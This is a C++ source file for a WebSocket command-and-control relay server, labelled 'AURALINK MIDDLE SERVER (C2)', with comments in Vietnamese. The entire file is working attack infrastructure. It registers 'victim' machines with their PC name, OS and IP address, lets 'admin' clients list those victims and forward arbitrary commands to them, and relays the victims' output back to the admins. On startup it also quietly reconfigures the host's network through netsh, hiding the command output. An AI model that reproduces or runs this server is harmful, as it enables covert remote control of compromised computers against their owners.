// =============================================================
// AURALINK MIDDLE SERVER 
// Nhiệm vụ: Chuyển tiếp dữ liệu giữa Admin và Victim
// Tinh nang: AI Auto Detect LAN & Silent Static IP
// Run as administrator
// =============================================================

#define _WIN32_WINNT 0x0A00
#include <winsock2.h>
#include <iphlpapi.h>
#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/strand.hpp>
#include <iostream>
#include <string>
#include <thread>
#include <memory>
#include <map>
#include <set>
#include <vector>
#include <algorithm>
#include <random>
#include <sstream>
#include <cctype>

// --- CAU HINH WINDOWS ---
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib") 

namespace beast = boost::beast;
namespace http = beast::http;
namespace websocket = beast::websocket;
namespace net = boost::asio;
using tcp = boost::asio::ip::tcp;

class Session; // Forward declaration

// =============================================================
// PHAN 1: HAM HO TRO SMART STATIC IP (SILENT MODE)
// =============================================================

void RunCMD(std::string cmd) {
    system(cmd.c_str());
}

std::string ToLower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(),
        [](unsigned char c) { return std::tolower(c); });
    return s;
}

void SmartStaticIPSetup() {
    ULONG outBufLen = 15000;
    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);

    if (GetAdaptersInfo(pAdapterInfo, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
    }

    if (pAdapterInfo && GetAdaptersInfo(pAdapterInfo, &outBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;

        std::string currentIP = "";
        std::string currentGateway = "";
        std::string currentSubnet = "";
        std::string adapterDesc = "";
        std::string detectedInterface = "Ethernet";

        // 1. Tim mang LAN dang hoat dong
        while (pAdapter) {
            std::string ip = pAdapter->IpAddressList.IpAddress.String;
            std::string gateway = pAdapter->GatewayList.IpAddress.String;
            if (ip != "0.0.0.0" && gateway != "0.0.0.0") {
                currentIP = ip;
                currentGateway = gateway;
                currentSubnet = pAdapter->IpAddressList.IpMask.String;
                adapterDesc = pAdapter->Description;
                break;
            }
            pAdapter = pAdapter->Next;
        }

        if (currentIP == "") {
            // Khong tim thay mang thi im lang thoat
            if (pAdapterInfo) free(pAdapterInfo); return;
        }

        // 2. Doan Interface
        std::string descLower = ToLower(adapterDesc);
        if (descLower.find("wireless") != std::string::npos ||
            descLower.find("wi-fi") != std::string::npos ||
            descLower.find("802.11") != std::string::npos ||
            descLower.find("wlan") != std::string::npos ||
            descLower.find("dual band") != std::string::npos) {
            detectedInterface = "Wi-Fi";
        }

        // 3. Tinh toan IP duoi .100
        std::string targetIP;
        size_t lastDot = currentIP.find_last_of('.');
        if (lastDot != std::string::npos) {
            std::string prefix = currentIP.substr(0, lastDot);
            targetIP = prefix + ".100";
        }

        if (currentIP == targetIP) {
            if (pAdapterInfo) free(pAdapterInfo); return;
        }

        // 4. THUC THI LENH (SILENT - THEM > nul 2>&1)
        // Dong nay se an toan bo thong bao loi "Run as administrator"
        std::string cmd = "netsh interface ip set address \"" + detectedInterface + "\" static " + targetIP + " " + currentSubnet + " " + currentGateway + " > nul 2>&1";
        std::string dnsCmd = "netsh interface ip set dns \"" + detectedInterface + "\" static 8.8.8.8 > nul 2>&1";

        RunCMD(cmd);
        RunCMD(dnsCmd);

        // Chi in ra 1 dong duy nhat de biet IP la gi
        std::cout << "[INFO] Server IP: " << targetIP << " (" << detectedInterface << ")\n";
    }

    if (pAdapterInfo) free(pAdapterInfo);
}

// =============================================================
// PHAN 2: SERVER MANAGER & LOGIC C2 (GIU NGUYEN)
// =============================================================

class ServerManager {
public:
    std::map<std::string, std::shared_ptr<Session>> victims;
    std::set<std::shared_ptr<Session>> admins;

    std::string generateID() {
        static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        std::string tmp_s;
        tmp_s.reserve(10);
        static std::random_device rd;
        static std::mt19937 gen(rd());
        static std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);
        for (int i = 0; i < 10; ++i) tmp_s += alphanum[dis(gen)];
        return tmp_s;
    }

    void join_admin(std::shared_ptr<Session> session);
    void join_victim(std::shared_ptr<Session> session, std::string id);
    void leave(std::shared_ptr<Session> session);
    void broadcast_to_admins(std::string msg);
    void send_to_victim(std::string id, std::string msg);
    void send_victim_list(std::shared_ptr<Session> admin_session);
};

class Session : public std::enable_shared_from_this<Session> {
    websocket::stream<beast::tcp_stream> ws_;
    beast::flat_buffer buffer_;
    ServerManager& manager_;

public:
    std::string id_;
    std::string role_ = "unknown";
    std::string pc_name_ = "Unknown";
    std::string os_ver_ = "Unknown";
    std::string ip_addr_;

    explicit Session(tcp::socket&& socket, ServerManager& manager)
        : ws_(std::move(socket)), manager_(manager) {
    }

    void run() {
        try { ip_addr_ = ws_.next_layer().socket().remote_endpoint().address().to_string(); }
        catch (...) { ip_addr_ = "unknown"; }
        ws_.set_option(websocket::stream_base::timeout::suggested(beast::role_type::server));
        ws_.async_accept(beast::bind_front_handler(&Session::on_accept, shared_from_this()));
    }

    void on_accept(beast::error_code ec) {
        if (ec) return;
        do_read();
    }

    void do_read() {
        ws_.async_read(buffer_, beast::bind_front_handler(&Session::on_read, shared_from_this()));
    }

    void on_read(beast::error_code ec, std::size_t bytes_transferred) {
        boost::ignore_unused(bytes_transferred);
        if (ec == websocket::error::closed) { manager_.leave(shared_from_this()); return; }
        if (ec) { manager_.leave(shared_from_this()); return; }

        std::string msg = beast::buffers_to_string(buffer_.data());
        handle_message(msg);
        buffer_.consume(buffer_.size());
        do_read();
    }

    void send(std::string msg) {
        auto self = shared_from_this();
        ws_.async_write(net::buffer(msg), [self](beast::error_code ec, std::size_t) {
            if (ec) std::cerr << "Write Error: " << ec.message() << "\n";
            });
    }

private:
    void handle_message(std::string msg) {
        if (role_ == "unknown") {
            if (msg.rfind("TYPE:ADMIN", 0) == 0) {
                role_ = "admin";
                manager_.join_admin(shared_from_this());
            }
            else if (msg.rfind("TYPE:VICTIM|", 0) == 0) {
                role_ = "victim";
                id_ = manager_.generateID();
                size_t p1 = msg.find('|');
                size_t p2 = msg.find('|', p1 + 1);
                if (p1 != std::string::npos) {
                    if (p2 != std::string::npos) {
                        pc_name_ = msg.substr(p1 + 1, p2 - (p1 + 1));
                        os_ver_ = msg.substr(p2 + 1);
                    }
                    else { pc_name_ = msg.substr(p1 + 1); }
                }
                manager_.join_victim(shared_from_this(), id_);
            }
            return;
        }

        if (role_ == "admin") {
            if (msg.rfind("FORWARD|", 0) == 0) {
                size_t p1 = msg.find('|');
                size_t p2 = msg.find('|', p1 + 1);
                if (p2 != std::string::npos) {
                    std::string targetId = msg.substr(p1 + 1, p2 - (p1 + 1));
                    std::string cmd = msg.substr(p2 + 1);
                    manager_.send_to_victim(targetId, cmd);
                }
            }
            else if (msg == "GET_LIST") {
                manager_.send_victim_list(shared_from_this());
            }
        }
        else if (role_ == "victim") {
            manager_.broadcast_to_admins("DATA|" + id_ + "|" + msg);
        }
    }
};

void ServerManager::join_admin(std::shared_ptr<Session> session) {
    admins.insert(session);
    std::cout << "[ADMIN] New admin connected.\n";
    send_victim_list(session);
}

void ServerManager::join_victim(std::shared_ptr<Session> session, std::string id) {
    victims[id] = session;
    std::cout << "[VICTIM] Connected: " << session->pc_name_ << " (ID: " << id << ")\n";
    broadcast_to_admins("VICTIM_CONNECTED|" + id + "|" + session->pc_name_ + "|" + session->os_ver_ + "|" + session->ip_addr_);
}

void ServerManager::leave(std::shared_ptr<Session> session) {
    if (session->role_ == "admin") {
        admins.erase(session);
        std::cout << "[ADMIN] Disconnected.\n";
    }
    else if (session->role_ == "victim") {
        victims.erase(session->id_);
        std::cout << "[VICTIM] Disconnected: " << session->pc_name_ << "\n";
        broadcast_to_admins("VICTIM_DISCONNECTED|" + session->id_);
    }
}

void ServerManager::broadcast_to_admins(std::string msg) {
    for (auto& admin : admins) { admin->send(msg); }
}

void ServerManager::send_to_victim(std::string id, std::string msg) {
    if (victims.count(id)) {
        victims[id]->send(msg);
        std::cout << "[CMD] Admin -> " << victims[id]->pc_name_ << ": " << msg.substr(0, 20) << "...\n";
    }
}

void ServerManager::send_victim_list(std::shared_ptr<Session> admin_session) {
    std::string listMsg = "LIST_VICTIMS";
    for (auto const& [id, sess] : victims) {
        listMsg += "|" + id + "," + sess->pc_name_ + "," + sess->os_ver_;
    }
    admin_session->send(listMsg);
}

class Listener : public std::enable_shared_from_this<Listener> {
    net::io_context& ioc_;
    tcp::acceptor acceptor_;
    ServerManager& manager_;
public:
    Listener(net::io_context& ioc, tcp::endpoint endpoint, ServerManager& manager)
        : ioc_(ioc), acceptor_(ioc), manager_(manager) {
        beast::error_code ec;
        acceptor_.open(endpoint.protocol(), ec);
        acceptor_.set_option(net::socket_base::reuse_address(true), ec);
        acceptor_.bind(endpoint, ec);
        acceptor_.listen(net::socket_base::max_listen_connections, ec);
        if (ec) { std::cerr << "Listener Error: " << ec.message() << "\n"; return; }
    }
    void run() { do_accept(); }
private:
    void do_accept() {
        acceptor_.async_accept(net::make_strand(ioc_), beast::bind_front_handler(&Listener::on_accept, shared_from_this()));
    }
    void on_accept(beast::error_code ec, tcp::socket socket) {
        if (!ec) { std::make_shared<Session>(std::move(socket), manager_)->run(); }
        do_accept();
    }
};

// =============================================================
// MAIN FUNCTION
// =============================================================
int main() {
    // 1. Setup IP
    SmartStaticIPSetup();

    // 2. Start Server
    system("chcp 65001 > nul");
    auto const address = net::ip::make_address("0.0.0.0");
    unsigned short port = 8080;
    int threads = 1;

    std::cout << "==========================================\n";
    std::cout << "   AURALINK MIDDLE SERVER (C2)\n";
    std::cout << "==========================================\n";
    std::cout << "Listening on port: " << port << "\n";
    std::cout << "Waiting for connections...\n";

    ServerManager manager;
    net::io_context ioc{ threads };

    std::make_shared<Listener>(ioc, tcp::endpoint{ address, port }, manager)->run();

    ioc.run();

    return 0;
}